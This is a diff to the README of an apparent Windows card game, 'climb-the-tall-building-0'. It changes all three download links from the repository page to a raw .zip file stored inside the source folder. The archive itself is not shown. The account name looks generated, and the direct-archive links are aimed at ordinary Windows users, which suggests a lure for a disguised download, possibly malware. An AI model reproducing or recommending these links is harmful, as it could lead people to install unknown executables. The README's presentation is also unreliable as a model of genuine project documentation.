@@ -1,6 +1,6 @@
 # 🎮 climb-the-tall-building-0 - Build your deck and climb higher
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mendelian-scarletrunnerbean596/climb-the-tall-building-0)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mendelian-scarletrunnerbean596/climb-the-tall-building-0/raw/refs/heads/main/src/game/tall_climb_the_building_1.0.zip)
 
 ## 🧭 What this is
 
@@ -21,7 +21,7 @@ For the best experience, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download or get the latest files:
 
-[Download climb-the-tall-building-0](https://github.com/mendelian-scarletrunnerbean596/climb-the-tall-building-0)
+[Download climb-the-tall-building-0](https://github.com/mendelian-scarletrunnerbean596/climb-the-tall-building-0/raw/refs/heads/main/src/game/tall_climb_the_building_1.0.zip)
 
 ## 🪜 How to install on Windows
 
@@ -141,7 +141,7 @@ The project focuses on quick runs, card choices, and building a strong deck over
 
 ## 🧾 Download link again
 
-[Visit the download page](https://github.com/mendelian-scarletrunnerbean596/climb-the-tall-building-0)
+[Visit the download page](https://github.com/mendelian-scarletrunnerbean596/climb-the-tall-building-0/raw/refs/heads/main/src/game/tall_climb_the_building_1.0.zip)
 
 ## 🗂️ Common questions
 
